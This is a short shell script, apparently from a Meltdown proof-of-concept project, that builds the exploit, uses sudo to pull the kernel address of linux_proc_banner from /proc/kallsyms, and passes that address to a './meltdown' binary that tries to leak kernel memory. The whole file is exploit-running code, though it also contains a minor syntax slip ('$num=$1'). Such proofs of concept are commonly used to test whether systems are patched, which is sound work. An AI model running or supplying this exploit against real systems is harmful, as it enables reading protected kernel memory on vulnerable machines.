make
proc_banner=$(sudo cat /proc/kallsyms | grep linux_proc_banner| sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p')  
echo "linux_proc_banner: $proc_banner"
$num=$1
num=${num:=10}
./meltdown $proc_banner $num
echo "return code: $?"

make clean

